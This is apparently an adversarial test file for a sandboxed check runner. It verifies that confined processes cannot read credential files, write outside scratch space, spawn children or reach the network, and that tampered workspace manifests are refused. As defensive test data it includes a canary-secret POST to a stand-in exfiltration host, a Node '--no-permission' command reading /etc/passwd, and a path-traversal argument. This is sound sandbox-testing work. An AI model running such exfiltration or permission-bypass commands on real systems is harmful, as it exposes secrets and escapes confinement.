import assert from "node:assert/strict";
import { cp, mkdir, mkdtemp, readFile, readdir, rm, writeFile } from "node:fs/promises";
import { spawnSync } from "node:child_process";
import { join, resolve } from "node:path";
import test, { type TestContext } from "node:test";
import { prepareFocusedCheck } from "../../src/commands/check.ts";
import { canonicalDigest } from "../../src/core/canonical.ts";
import { loadSemanticGraph } from "../../src/graph/index.ts";
import { deriveWork, type WorkPacket } from "../../src/graph/work.ts";
import { candidateScope, materialiseCandidate, type CandidateSpec } from "../../src/realisation/index.ts";
import type { RealisationBasis } from "../../src/realisation/basis.ts";

const sourceRoot = resolve(import.meta.dirname, "../..");
const workspaceTemporaryRoot = process.env.TMPDIR === undefined ? resolve(sourceRoot, ".usf/tmp") : resolve(process.env.TMPDIR);
const manifestPath = "graph/manifests/self-host.json";
const profile = "urn:usf:profile:v3-self-host:1";
const workId = "urn:usf:work:realisation-basis-chain";
const targetPath = "tests/adversarial/realisation-check.test.ts";
type ProfileBoundPacket = WorkPacket & Readonly<{ realisationBasis: RealisationBasis }>;

async function assertConfinedNetworkNamespace(): Promise<void> {
  if (process.env.USF_BWRAP_NETWORK !== "isolated") return;
  const routes = (await readFile("/proc/net/route", "utf8")).trimEnd().split("\n");
  assert.equal(routes.length, 1, "the focused child network namespace exposes no route");
  await assert.rejects(() => readFile("/etc/passwd", "utf8"), { code: "ENOENT" }, "an unmounted host path remains absent");
  const repositoryRoot = process.env.USF_REPOSITORY_ROOT!;
  for (const path of [join(repositoryRoot, ".env"), join(repositoryRoot, ".usf/home"), "/home/user/src/usf-v2/GOAL.md"]) {
    await assert.rejects(
      () => readFile(path, "utf8"),
      (error: unknown) => error instanceof Error && "code" in error && ["ENOENT", "ERR_ACCESS_DENIED"].includes(String(error.code)),
      `confined credential or historical read must fail: ${path}`,
    );
  }
  await assert.rejects(
    () => writeFile("/tmp/usf-candidate-escape", "refused\n", "utf8"),
    (error: unknown) => error instanceof Error && "code" in error && ["ENOENT", "ERR_ACCESS_DENIED"].includes(String(error.code)),
    "a write outside the candidate and controlled scratch must fail",
  );
  assert.throws(
    () => spawnSync("/usr/bin/true"),
    (error: unknown) => error instanceof Error && "code" in error && error.code === "ERR_ACCESS_DENIED",
    "an unapproved child process must fail",
  );
  const secretCanary = "sk-usf-adversarial-canary-do-not-exfiltrate";
  await assert.rejects(
    () => fetch("http://192.0.2.1:9/exfiltrate", {
      method: "POST",
      body: secretCanary,
      signal: AbortSignal.timeout(1_000),
    }),
    "a route-free namespace must refuse the network and canary exfiltration attempt",
  );
  assert.equal(process.env.NODE_OPTIONS, undefined, "the focused child receives no ambient Node options");
}

function lockProcessUnavailable(context: TestContext): boolean {
  const permission = (process as typeof process & { permission?: { has(scope: string): boolean } }).permission;
  if (permission === undefined || permission.has("child_process")) return false;
  context.skip("lock-owning USF operations are proven by the direct outer component validation");
  return true;
}

async function fixture(context: TestContext): Promise<string> {
  await mkdir(workspaceTemporaryRoot, { recursive: true, mode: 0o700 });
  const parent = await mkdtemp(join(workspaceTemporaryRoot, "usf-focused-check-"));
  const root = join(parent, "repo");
  await mkdir(root);
  for (const entry of await readdir(sourceRoot, { withFileTypes: true })) {
    if (entry.name === ".git" || entry.name === "node_modules" || entry.name.startsWith(".usf")) continue;
    await cp(join(sourceRoot, entry.name), join(root, entry.name), { recursive: true });
  }
  context.after(() => rm(parent, { recursive: true, force: true }));
  return root;
}

function basisFor(root: string): RealisationBasis {
  const result = deriveWork(loadSemanticGraph(root, manifestPath), { profile, selector: workId });
  const packet = result.items?.[0] as ProfileBoundPacket | undefined;
  assert.equal(result.status, "ok");
  assert.ok(packet?.realisationBasis);
  return packet.realisationBasis;
}

async function candidate(root: string, nonce: string): Promise<CandidateSpec> {
  const basis = basisFor(root);
  const operations = [{ kind: "write" as const, path: targetPath, content: await readFile(join(root, targetPath), "utf8") }];
  const acceptedContributionDigests = [canonicalDigest({ nonce })];
  return {
    digest: canonicalDigest({ basisDigest: basis.basisDigest, operations, acceptedContributionDigests }, { rejectAbsolutePaths: true }),
    basis,
    operations,
    lineage: { acceptedContributionDigests, rejected: [] },
    scope: candidateScope(basis),
    writeSet: [targetPath],
    preimages: { [targetPath]: basis.scope.preimages[targetPath]! },
  };
}

test("focused checks rederive the persisted basis before enforcing the command allowlist", async (context) => {
  await assertConfinedNetworkNamespace();
  if (lockProcessUnavailable(context)) return;
  const root = await fixture(context);
  const spec = await candidate(root, "confinement");
  const { workspace } = await materialiseCandidate(root, spec);
  assert.equal(spec.basis.work.dependencies.some((dependency) => dependency.key === "tests/fixtures/providers/"), true);
  assert.deepEqual(
    await readFile(join(workspace, "tests/fixtures/providers/models-dev.json")),
    await readFile(join(root, "tests/fixtures/providers/models-dev.json")),
  );

  const refused = await prepareFocusedCheck(root, spec.digest, [], "anything");
  assert.equal(refused.status, "refused");
  assert.equal(refused.reasonCode, "CHECK_NOT_ALLOWLISTED");
  assert.equal(refused.basis?.basisDigest, spec.basis.basisDigest);

  const confined = await prepareFocusedCheck(root, spec.digest, [{
    id: "bounded-test",
    command: ["node", "--test", "--test-isolation=none", "tests/unit/providers/routing.test.ts"],
  }], "bounded-test");
  assert.equal(confined.status, "ready");
  if (confined.status !== "ready") return;
  assert.equal(confined.basis.basisDigest, spec.basis.basisDigest);
  assert.equal(confined.executable, "/usr/bin/bwrap");
  assert.equal(confined.arguments[0], "--unshare-user");
  assert.equal(confined.arguments.includes("--unshare-net"), true);
  assert.equal(confined.arguments.includes("--clearenv"), true);
  assert.equal(confined.arguments.includes("--permission"), true);
  const readPermissions = confined.arguments.filter((argument) => argument.startsWith("--allow-fs-read="));
  assert.equal(readPermissions[0], `--allow-fs-read=${confined.workspace}`);
  assert.equal(readPermissions.length, 5);
  assert.equal(readPermissions[1]?.endsWith("/node_modules"), true);
  assert.equal(readPermissions[2]?.endsWith("/.usf/cache"), true);
  assert.equal(readPermissions[3], "--allow-fs-read=/etc/passwd");
  assert.equal(readPermissions[4], "--allow-fs-read=/proc/net/route");
  assert.equal(confined.arguments.some((argument) => argument === "--allow-child-process" || argument === "--allow-net"), false);

  const bypass = await prepareFocusedCheck(root, spec.digest, [{
    id: "permission-bypass",
    command: ["node", "--no-permission", "--eval", "import('node:fs').then((fs) => fs.readFileSync('/etc/passwd'))"],
  }], "permission-bypass");
  assert.equal(bypass.status, "refused");
  assert.equal(bypass.reasonCode, "CHECK_CONFINEMENT_UNAVAILABLE");

  const traversal = await prepareFocusedCheck(root, spec.digest, [{
    id: "test-traversal",
    command: ["node", "--test", "--test-isolation=none", "../../outside.test.ts"],
  }], "test-traversal");
  assert.equal(traversal.status, "refused");
  assert.equal(traversal.reasonCode, "CHECK_CONFINEMENT_UNAVAILABLE");
});

test("check refuses planted missing, fabricated and stale workspace authority", async (context) => {
  if (lockProcessUnavailable(context)) return;
  const root = await fixture(context);
  const allowlist = [{ id: "noop", command: ["node", "--test", "--test-isolation=none", "tests/unit/providers/routing.test.ts"] }] as const;
  const scenarios: Array<{ name: string; plant: (root: string, workspace: string) => Promise<void>; reason: string }> = [
    {
      name: "missing persisted basis",
      plant: async (_root, workspace) => {
        const path = join(workspace, ".usf-workspace.json");
        const manifest = JSON.parse(await readFile(path, "utf8")) as Record<string, unknown>;
        delete manifest.basis;
        await writeFile(path, JSON.stringify(manifest));
      },
      reason: "INVALID_WORKSPACE_MANIFEST",
    },
    {
      name: "fabricated persisted basis",
      plant: async (_root, workspace) => {
        const path = join(workspace, ".usf-workspace.json");
        const manifest = JSON.parse(await readFile(path, "utf8")) as { basis: { inputs: { policyDigest: string } } };
        manifest.basis.inputs.policyDigest = canonicalDigest("fabricated");
        await writeFile(path, JSON.stringify(manifest));
      },
      reason: "INVALID_REALISATION_BASIS",
    },
    {
      name: "mutated basis-bound dependency",
      plant: async (_root, workspace) => {
        const path = join(workspace, "schemas/provider-config.schema.json");
        await writeFile(path, `${await readFile(path, "utf8")}\n`);
      },
      reason: "CANDIDATE_BASIS_MISMATCH",
    },
    {
      name: "mutated graph-declared directory leaf",
      plant: async (_root, workspace) => {
        const path = join(workspace, "tests/fixtures/providers/models-dev.json");
        await writeFile(path, `${await readFile(path, "utf8")}\n`);
      },
      reason: "CANDIDATE_BASIS_MISMATCH",
    },
    {
      name: "extra empty candidate directory",
      plant: async (_root, workspace) => {
        await mkdir(join(workspace, "tests/fixtures/providers/extra-empty"), { recursive: true });
      },
      reason: "CANDIDATE_BASIS_MISMATCH",
    },
    {
      name: "stale policy input",
      plant: async (repositoryRoot) => {
        const path = join(repositoryRoot, "config/privacy.json");
        await writeFile(path, `${await readFile(path, "utf8")}\n`);
      },
      reason: "STALE_REALISATION_BASIS",
    },
  ];

  for (const scenario of scenarios) {
    const spec = await candidate(root, scenario.name);
    const { workspace } = await materialiseCandidate(root, spec);
    await scenario.plant(root, workspace);
    const result = await prepareFocusedCheck(root, spec.digest, allowlist, "noop");
    assert.equal(result.status, "refused", scenario.name);
    assert.equal(result.reasonCode, scenario.reason, scenario.name);
    if (scenario.name === "stale policy input") break;
  }
});
